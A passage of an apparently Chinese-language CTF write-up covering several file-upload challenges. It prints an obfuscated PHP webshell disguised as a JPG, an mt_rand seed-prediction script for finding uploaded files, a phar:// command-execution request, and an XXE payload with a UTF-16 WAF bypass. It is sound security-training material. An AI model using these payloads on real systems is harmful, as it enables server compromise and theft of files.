class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span>(<span class="params"><span class="variable">$message</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;div class=\&quot;msg success\&quot; id=\&quot;message\&quot;&gt; </span></span><br><span class="line"><span class="string">    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;<span class="subst">$message</span>&lt;/div&gt;&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span>(<span class="params"><span class="variable">$length </span>= <span class="string">&quot;32&quot;</span></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="variable">$set </span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,  </span><br><span class="line">        <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);  </span><br><span class="line">    <span class="variable">$str </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i </span>= <span class="number">1</span>; <span class="variable">$i </span>&lt;= <span class="variable">$length</span>; ++<span class="variable">$i</span>) &#123;  </span><br><span class="line">        <span class="variable">$ch </span>= mt_rand(<span class="number">0</span>, count(<span class="variable">$set</span>) - <span class="number">1</span>);  </span><br><span class="line">        <span class="variable">$str </span>.= <span class="variable">$set</span>[<span class="variable">$ch</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">session_start();  </span><br><span class="line"><span class="variable">$reg</span>=<span class="string">&#x27;/gif|jpg|jpeg|png/&#x27;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="variable">$seed </span>= rand(<span class="number">0</span>,<span class="number">999999999</span>);  </span><br><span class="line">    mt_srand(<span class="variable">$seed</span>);  </span><br><span class="line">    <span class="variable">$ss </span>= mt_rand();  </span><br><span class="line">    <span class="variable">$hash </span>= md5(session_id() . <span class="variable">$ss</span>);  </span><br><span class="line">    setcookie(<span class="string">&#x27;SESSI0N&#x27;</span>, <span class="variable">$hash</span>, time() + <span class="number">3600</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">        show_error_message(<span class="string">&quot;Upload ERROR. Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;error&quot;</span>]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="variable">$check2 </span>= (((<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)  </span><br><span class="line">            || (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))  </span><br><span class="line">        &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>));  </span><br><span class="line">    <span class="variable">$check3</span>=!preg_match(<span class="variable">$reg</span>,pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION));  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check3</span>) show_error_message(<span class="string">&quot;Nope!&quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$check2</span>) &#123;  </span><br><span class="line">        <span class="variable">$filename </span>= <span class="string">&#x27;./uP1O4Ds/&#x27;</span> . random_str() . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];  </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file-upload-field&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;  </span><br><span class="line">            show_message(<span class="string">&quot;Upload successfully. File type:&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file-upload-field&quot;</span>][<span class="string">&quot;type&quot;</span>]);  </span><br><span class="line">        &#125; <span class="keyword">else</span> show_error_message(<span class="string">&quot;Something wrong with the upload...&quot;</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        show_error_message(<span class="string">&quot;only allow gif/jpeg/png files smaller than 200kb!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>可以看出过滤机制采用了了严格的白名单限制，并且cookie内的session使用随机种子得到<code>（mt_rand）</code>。另外，我们还得到了文件路径的语法<code>$filename= &#39;./uP1O4Ds/&#39; . random_str() . &#39;_&#39; . \$_FILES[&#39;file-upload-field&#39;][&#39;name&#39;];</code></p><p>下面我们制作一个图片马，密码1129，保存为php文件再压缩为zip文件，然后改后缀为jpg：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$dXuD</span>=create_function(chr(<span class="number">01402</span>-<span class="number">01336</span>).chr(<span class="number">01140</span>-<span class="number">0755</span>).base64_decode(<span class="string">&#x27;bw==&#x27;</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).chr(<span class="number">0146615</span>/<span class="number">01011</span>),chr(<span class="number">01421</span>-<span class="number">01254</span>).base64_decode(<span class="string">&#x27;dg==&#x27;</span>).chr(<span class="number">01550</span>-<span class="number">01407</span>).str_rot13(<span class="string">&#x27;y&#x27;</span>).chr(<span class="number">0x2170</span>/<span class="number">0xd6</span>).chr(<span class="number">030644</span>/<span class="number">0541</span>).chr(<span class="number">0x340</span>-<span class="number">0x2cd</span>).chr(<span class="number">330</span>-<span class="number">219</span>).base64_decode(<span class="string">&#x27;bQ==&#x27;</span>).str_rot13(<span class="string">&#x27;r&#x27;</span>).chr(<span class="number">13653</span>/<span class="number">333</span>).base64_decode(<span class="string">&#x27;Ow==&#x27;</span>));<span class="variable">$dXuD</span>(base64_decode(<span class="string">&#x27;NTc3M&#x27;</span>.<span class="string">&#x27;zEyO0&#x27;</span>.<span class="string">&#x27;BldkF&#x27;</span>.<span class="string">&#x27;sKCRf&#x27;</span>.<span class="string">&#x27;&#x27;</span>.base64_decode(<span class="string">&#x27;VQ==&#x27;</span>).base64_decode(<span class="string">&#x27;RQ==&#x27;</span>).chr(<span class="number">30267</span>/<span class="number">531</span>).base64_decode(<span class="string">&#x27;VA==&#x27;</span>).str_rot13(<span class="string">&#x27;I&#x27;</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;&#x27;</span>.chr(<span class="number">969</span>-<span class="number">899</span>).chr(<span class="number">0x2b6</span>-<span class="number">0x243</span>).chr(<span class="number">36720</span>/<span class="number">306</span>).chr(<span class="number">0x11ba3</span>/<span class="number">0x3af</span>).chr(<span class="number">0113110</span>/<span class="number">0712</span>).<span class="string">&#x27;&#x27;</span>.<span class="string">&#x27;I5XSk&#x27;</span>.<span class="string">&#x27;7MTcz&#x27;</span>.<span class="string">&#x27;MTkzN&#x27;</span>.<span class="string">&#x27;js=&#x27;</span>.<span class="string">&#x27;&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传后抓包，Send to Repeater，为了得到种子，我们要把原来的sessionid清空：</p><p><img src="/img/aa5430fe8464f1402c101ca94d1d606c.png"></p><p><img src="/img/80c60aeecdf8d49d8d5ce04cf75ec7f2.png"></p><p>这样我们就得到了随机数的md5值，在线破解一下：</p><p><img src="/img/48181c60cde03494a7436d8a5f4e8c90.png"></p><p>这样就得到了随机数，然后用<code>php_mt_seed</code>爆破种子：</p><p><img src="/img/dc8c91bb034cddf588e9cb82f780c9ae.png"></p><p>下面我们用脚本获取文件路径，方法很简单，因为之前的源码泄露已经让我们知道了方法，只要把代码在本地运行一下然后<code>echo</code>输出一下就可以了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="comment">//   </span></span><br><span class="line"><span class="variable">$arr </span>= <span class="keyword">array</span>(<span class="number">319716295</span>);    </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr as</span> <span class="variable">$a</span>) &#123;  </span><br><span class="line">    mt_srand(<span class="variable">$a</span>);  </span><br><span class="line">    <span class="variable">$set </span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;A&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;F&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;g&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;L&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;m&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;R&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;s&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;X&quot;</span>,  </span><br><span class="line">                 <span class="string">&quot;y&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>);  </span><br><span class="line">    <span class="variable">$str </span>= <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="variable">$ss </span>= mt_rand();  </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i </span>= <span class="number">1</span>; <span class="variable">$i </span>&lt;= <span class="number">32</span>; ++<span class="variable">$i</span>) &#123;  </span><br><span class="line">        <span class="variable">$ch </span>= mt_rand(<span class="number">0</span>, count(<span class="variable">$set</span>) - <span class="number">1</span>);  </span><br><span class="line">        <span class="variable">$str </span>.= <span class="variable">$set</span>[<span class="variable">$ch</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&#x27;http://111.200.241.244:58338/uP1O4Ds/&#x27;</span> . <span class="variable">$str </span>. <span class="string">&#x27;_1.jpg&#x27;</span> .<span class="string">&quot;\n\r&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="/img/phponline.png"></p><p>由于上面的seed不止一个，我们多试几次就可以了。访问后提示图片无法正常显示说明图片存在，则我们的地址是正确的。下面直接使用phar伪协议读取一下我们的图片马即可。</p><p>由于该题的hint为“flag在根目录/flag”，所以直接调用系统命令<code>cat /flag</code>可以得到flag，命令如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:58338/?page=phar://uP1O4Ds/y7IMaolTI6nB7vWgigVVEA35HrXlKhqc_1.jpg/1&amp;cmd=echo system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/img/da73a33f7093ea0cf4683f39853c2572.png"></p><p>另外，也可以直接用Antsword连接服务器获取，两种方法均可以。</p><h2 id="unagi-（难度：8-10）"><a href="#unagi-（难度：8-10）" class="headerlink" title="unagi （难度：8/10）"></a><img src="/img/a21a502b363b0b96291149fdf24c25d3.png">unagi （难度：8/10）</h2><p>通过题目页面以及提示“Flag is located at /flag, come get it”可以发现本题应该与某文件上传有关。点击查看example如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出是一段XML代码，这样本题应该是一道XXE题目。XXE(XML External Entity Injection) 全称为 XML 外部实体注入，利用XML这种类似于HTML（超文本标记语言）的可扩展标记语言，特别是其中的可作为一个外部引用的文档类型定义（DTD）来执行恶意代码。当应用是通过用户上传的XML文件或POST请求进行数据的传输，并且应用没有禁止XML引用外部实体，也没有过滤用户提交的XML数据，那么就会产生XML外部实体注入漏洞，即XXE漏洞。</p><p>那么我们对example做一下改动，加入DTD以执行<code>cat /flag</code>命令，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxetest</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intro</span>&gt;</span><span class="symbol">&amp;xxetest;</span><span class="tag">&lt;/<span class="name">intro</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>保存至xxetest.xml文件中进行上传，回显WAF blocked uploaded file. Please try again，如下图所示：</p><p><img src="/img/8dc72ac3f35ca10cd4de62b721a968bd.png"></p><p>查阅资料得知，xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体- BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码，因此我们把之前的xml文件转为16进制，在Linux环境中使用如下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf-16 xxetest.xml\&gt;exp.xml</span><br></pre></td></tr></table></figure><p><img src="/img/a94a368fb6c5be80a20fc12377e112fe.png"></p><p>成功得到flag。</p><p><img src="/img/b49bff72691e891f52a702e74591e52d.png"></p><h2 id="upload3-（难度：10-10）"><a href="#upload3-（难度：10-10）" class="headerlink" title="upload3 （难度：10/10）"></a>upload3 （难度：10/10）</h2><div class="note info flat"><p>注：因攻防世界上本题容器创建有问题，所以本题将在buuctf上继续答题。</p></div><p>进入环境后是一个登录页面：</p><p><img src="/img/db57e42a64b775f4cfceca33bb4ab942.png"></p><p>登录后是文件上传页面：</p><p><img src="/img/a842b5ef572b7b4a41c58ef0a3d66251.png"></p><p>首先用dirsearch工具扫描一下目录，发现有一个24MB的<code>www.tar.gz</code>文件以及upload目录，结合本题题目推测本题应该是一个文件上传题。下载<code>www.tar.gz</code>文件，观察后发现是<code>ThinkPHP5</code>框架。</p><p><img src="/img/a763a0d44f520669432a6bb829db52d0.png"></p><p>下面进行代码审计。首先是index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;  </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$profile_db</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;  </span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/home&quot;</span>;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;index&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;  </span><br><span class="line">            <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect(<span class="variable">$curr_url</span>,<span class="number">302</span>);  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;upload&quot;</span>);  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;img&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;img&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">&quot;username&quot;</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">&#x27;username&#x27;</span>]);  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">&quot;home&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span 